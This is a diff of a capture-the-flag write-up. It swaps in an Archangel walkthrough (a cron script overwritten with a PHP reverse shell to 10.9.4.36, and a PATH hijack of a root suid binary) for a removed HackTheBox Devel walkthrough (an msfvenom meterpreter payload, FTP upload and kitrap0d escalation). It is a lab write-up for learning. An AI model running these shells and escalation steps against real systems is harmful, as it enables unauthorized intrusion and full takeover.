@@ -112,7 +112,7 @@ On browsing the main website we see the following page:
 
 In the source code we find a template is used from https://www.os-templates.com/. A web page featuring a comment posting form is found on /pages/full-width.html, but no action is performed by the POST request.
 
-![ImgPlaceholder](screenshots/post-request.png)
+![ImgPlaceholder](screenshots/post-comment.png)
 
 We find the support email, and we add the mafialive.thm to the /etc/hosts file
 
@@ -359,7 +359,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 We give execute permission to linpeas.sh and execute it:
 
 ![ImgPlaceholder](screenshots/download-execute-linpeas.png)
+
+We find a shell script with suid rights to archangel user:
+
 ```
+*/1 *   * * *   archangel /opt/helloworld.sh     
+```
+
 
 ```
 $ cat /opt/helloworld.sh
@@ -372,6 +378,15 @@ drwxr-xr-x 22 root      root      4096 Nov 16 15:39 ..
 drwxrwx---  2 archangel archangel 4096 Nov 20 15:04 backupfiles
 -rwxrwxrwx  1 archangel archangel   66 Nov 20 10:35 helloworld.sh
 ```
+
+We execute the following commands to replace the script:
+
+```
+$ echo '#!/bin/bash' > /opt/helloworld.sh
+$ echo "php -r '\$sock=fsockopen(\"10.9.4.36\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >> /opt/helloworld.sh
+```
+
+then we open a NetCat listening on 4242 waiting to receive a reverse shell:
 
 ```
 $ nc -lnvp 4242
@@ -396,313 +411,138 @@ $ cat user2.txt
 thm{xxxxxxxxxxx}
 ```
 
+We execute again the linpeas.sh script and find another executable with suid rights:
 
 ```
 $ ls -l /home/archangel/secret/backup
 -rwsr-xr-x 1 root root 16904 Nov 18 16:40 /home/archangel/secret/backup
 ```
 
-```
-$ ldd /home/archangel/secret/backup
-        linux-vdso.so.1 (0x00007ffffa113000)
-        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6d51886000)
-        /lib64/ld-linux-x86-64.so.2 (0x00007f6d51c77000)
-```
-
-
-
-
-We get access to the webshell:
-
-![ImgPlaceholder](screenshots/webshell.png)
-
-We create a reverse meterpreter executable:
+Using strings executable we find the hardcoded strings in this file:
 
 ```
-user@kali:~/hackthebox/hackthebox/devel/upload$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.14.27" LPORT=4444 -f exe > shell.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 354 bytes
-Final size of exe file: 73802 bytes
+$ strings backup
+/lib64/ld-linux-x86-64.so.2
+setuid  
+system
+__cxa_finalize
+setgid  
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH        
+[]A\A]A^A_         
+cp /home/user/archangel/myfiles/* /opt/backupfiles                            
+:*3$"     
+GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0                                         
+/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o            
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux       
+completed.0    
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+backup.c                                                                      
+__FRAME_END__          
+__init_array_end                                                              
+_DYNAMIC      
+__init_array_start                                                            
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
 ```
 
-We upload this executable and winPEAS.cmd using FTP to the host:
+One notable string we find is: cp /home/user/archangel/myfiles/\* /opt/backupfiles
+                            
+We can exploit the cp command by copying the '/bin/bash' string to a 'cp' file, giving it execute rights and set the PATH variable:
 
 ```
-user@kali:~/hackthebox/hackthebox/devel/upload$ ftp 10.10.10.5
-Connected to 10.10.10.5.
-220 Microsoft FTP Service
-Name (10.10.10.5:user): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
-Password:
-230 User logged in.
-Remote system type is Windows_NT.
-ftp> binary
-200 Type set to I.
-ftp> put shell.exe
-local: shell.exe remote: shell.exe
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-226 Transfer complete.
-73802 bytes sent in 0.00 secs (612.0267 MB/s)
-ftp> put winPEAS.bat
-local: winPEAS.bat remote: winPEAS.bat
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-226 Transfer complete.
-32976 bytes sent in 0.00 secs (655.1743 MB/s)
-ftp> dir
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-03-18-17  01:06AM       <DIR>          aspnet_client
-01-06-21  10:16PM                 1442 cmdasp.aspx
-03-17-17  04:37PM                  689 iisstart.htm
-01-06-21  11:27PM                73802 shell.exe
-01-06-21  10:06PM                    7 test.txt
-03-17-17  04:37PM               184946 welcome.png
-01-06-21  11:11PM                32976 winPEAS.bat
-226 Transfer complete.
-ftp> 
+$ echo "/bin/bash" > cp 
+$ ls -l
+total 32
+-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup
+-rw-rw-r-- 1 archangel archangel    10 Feb  6 20:43 cp
+-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
+-rw-rw-r-- 1 archangel archangel   151 Feb  6 20:26 x.c
+$ chmod +x cp
+$ ls -l
+total 32
+-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup
+-rwxrwxr-x 1 archangel archangel    10 Feb  6 20:43 cp
+-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
+-rw-rw-r-- 1 archangel archangel   151 Feb  6 20:26 x.c
+$ export PATH=$PWD:$PATH
+$ set
+HOME='/home/archangel'
+IFS=' 
+'
+LANG='en_IN'
+LOGNAME='archangel'
+OLDPWD='/home/archangel'
+OPTIND='1'
+PATH='/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin'
+PPID='15668'
+PS1='$ '
+PS2='> '
+PS4='+ '
+PWD='/home/archangel/secret'
+SHELL='/bin/sh'
+SHLVL='1'
+_='est'
 ```
 
+Now we can execute this backup suid root file to escalate to root and read the root flag:
 
-```
-```
-
-We find the winPEAS.bat and the reverse.exe files when we check the directory C:\inetpub\wwwroot with the webshell:
-
-![ImgPlaceholder](screenshots/shell-uploaded.png)
-
-We execute the shell.exe binary and we watch the Meterpreter reverse shell callback:
-
-![ImgPlaceholder](screenshots/execute-shell.png)
-
-```
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 10.10.14.27:4444 
-^[[A[*] Sending stage (175174 bytes) to 10.10.10.5
-[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.5:49165) at 2021-01-06 22:36:24 +0100
-
-meterpreter > getuid
-Server username: IIS APPPOOL\Web
-meterpreter > pwd
-c:\windows\system32\inetsrv
-meterpreter > shell                                                                                   
-Process 2980 created.                                                                                 
-Channel 1 created.                                                                                    
-Microsoft Windows [Version 6.1.7600]                                                                  
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                       
-                                                                                                      
-c:\windows\system32\inetsrv>
-```
-
-We execute the winPEAS.bat file:
-
-```
-user@kali:~/hackthebox/hackthebox/devel$ head -400 winpeas.out   
-c:\inetpub\wwwroot>winPEAS.bat                                                                        
-winPEAS.bat                                                                                           
-            *((,.,/((((((((((((((((((((/,  */
-     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                              
-   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*  
-   ((((((((((((((((* *****,,,/########## .(* ,((((((                           
-   (((((((((((/* ******************/####### .(. ((((((
-   ((((((..******************/@@@@@/***/######* /((((((                                               
-   ,,..**********************@@@@@@@@@@(***,#### ../(((((
-   , ,**********************#@@@@@#@@@@*********##((/ /((((                          
-   ..(((##########*********/#@@@@@@@@@/*************,,..((((
-   .(((################(/******/@@@@@#****************.. /((                        
-   .((########################(/************************..*(                                          
-   .((#############################(/********************.,(                                                                                                                                                
-   .((##################################(/***************..(                                          
-   .((######################################(************..(                          
-   .((######(,.***.,(###################(..***(/*********..(                                                                                                                                                
-  .((######*(#####((##################((######/(********..(                               
-   .((##################(/**********(################(**...(                                          
-   .(((####################/*******(###################.((((                                      
-   .(((((############################################/  /((
-   ..(((((#########################################(..(((((.
-   ....(((((#####################################( .((((((.                      
-   ......(((((#################################( .(((((((.                                            
-   (((((((((. ,(############################(../(((((((((.
-       (((((((((/,  ,####################(/..((((((((((.                                              
-             (((((((((/,.  ,*//////*,. ./(((((((((((.
-                (((((((((((((((((((((((((((/"      
-                       by carlospolop                                                                 
-ECHO is off.                  
-Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator.
-Use it at your own networks and/or with the network owner's permission.
-ECHO is off.                                                                                          
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
-[i] Check for vulnerabilities for the OS version with the applied patches
-  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
-                                                                                                      
-Host Name:                 DEVEL                                                                      
-OS Name:                   Microsoft Windows 7 Enterprise                                             
-OS Version:                6.1.7600 N/A Build 7600                                                    
-OS Manufacturer:           Microsoft Corporation   
-OS Configuration:          Standalone Workstation  
-OS Build Type:             Multiprocessor Free                                                        
-Registered Owner:          babis      
-Registered Organization:                                                                              
-Product ID:                55041-051-0948536-86302                                                    
-Original Install Date:     17/3/2017, 4:17:31                                                         
-System Boot Time:          6/1/2021, 9:57:15       
-System Manufacturer:       VMware, Inc.                                                               
-System Model:              VMware Virtual Platform                                                    
-System Type:               X86-based PC                                                               
-Processor(s):              1 Processor(s) Installed.
-                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             el;Greek
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
-Total Physical Memory:     3.071 MB
-Available Physical Memory: 2.474 MB
-Virtual Memory: Max Size:  6.141 MB
-Virtual Memory: Available: 5.546 MB
-Virtual Memory: In Use:    595 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    HTB
-Logon Server:              N/A
-Hotfix(s):                 N/A
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: vmxnet3 Ethernet Adapter
-                                 Connection Name: Local Area Connection 3
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.5
-                                 [02]: fe80::58c0:f1cf:abc6:bb9e
-                                 [03]: dead:beef::85b2:aea0:b80d:4690
-                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
-
-No Instance(s) Available.
-
-
-
-
-
-"Microsoft Windows 7 Enterprise   "
-[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
-No Instance(s) Available.
-MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
-...
-report continues, see winPEAS.out file.
-...
-```
-
-We execute the exploit suggester in metasploit:
-```
-meterpreter > background 
-[*] Backgrounding session 1...
-msf6 exploit(multi/handler) > search suggester
-
-Matching Modules
-================
-
-   #  Name                                      Disclosure Date  Rank    Check  Description
-   -  ----                                      ---------------  ----    -----  -----------
-   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
-
-
-Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
-
-msf6 exploit(multi/handler) > use 0
-msf6 post(multi/recon/local_exploit_suggester) > options
-
-Module options (post/multi/recon/local_exploit_suggester):
-
-   Name             Current Setting  Required  Description
-   ----             ---------------  --------  -----------
-   SESSION          1                yes       The session to run this module on
-   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
-
-msf6 post(multi/recon/local_exploit_suggester) > set session 1
-session => 1
-msf6 post(multi/recon/local_exploit_suggester) > run
-
-[*] 10.10.10.5 - Collecting local exploits for x86/windows...
-[*] 10.10.10.5 - 34 exploit checks are being tried...
-[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-nil versions are discouraged and will be deprecated in Rubygems 4
-[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
-[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
-[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
-[*] Post module execution completed
-msf5 post(multi/recon/local_exploit_suggester) > 
-```
-
-We escalate to system privileges usin the ms10_015_kitrap0d exploit:
-
-```
-msf6 exploit(windows/local/bypassuac_eventvwr) > use windows/local/ms10_015_kitrap0d
-[*] Using configured payload windows/meterpreter/reverse_tcp
-msf6 exploit(windows/local/ms10_015_kitrap0d) > options
-
-Module options (exploit/windows/local/ms10_015_kitrap0d):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION  1                yes       The session to run this module on.
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.0.205    yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Windows 2K SP4 - Windows 7 (x86)
-
-
-msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
-lhost => tun0
-msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
-lport => 5555
-msf6 exploit(windows/local/ms10_015_kitrap0d) > run
-
-[*] Started reverse TCP handler on 10.10.14.27:5555 
-[*] Launching notepad to host the exploit...
-[+] Process 1996 launched.
-[*] Reflectively injecting the exploit DLL into 1996...
-[*] Injecting exploit into 1996 ...
-[*] Exploit injected. Injecting payload into 1996...
-[*] Payload injected. Executing exploit...
-[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-[*] Sending stage (175174 bytes) to 10.10.10.5
-[*] Meterpreter session 2 opened (10.10.14.27:5555 -> 10.10.10.5:49170) at 2021-01-06 23:14:17 +0100
-
-meterpreter > 
-```
-
-The priv escalation on screen (restarted the session due to disconnection of session):
-
-![ImgPlaceholder](screenshots/escalate.png)
-
-We find the flags in the Desktop directories of the babis, Administrator accounts:
-
-![ImgPlaceholder](screenshots/flags.png)
+![ImgPlaceholder](screenshots/root-flag.png)
 
 **Vulnerability Fix:**
 
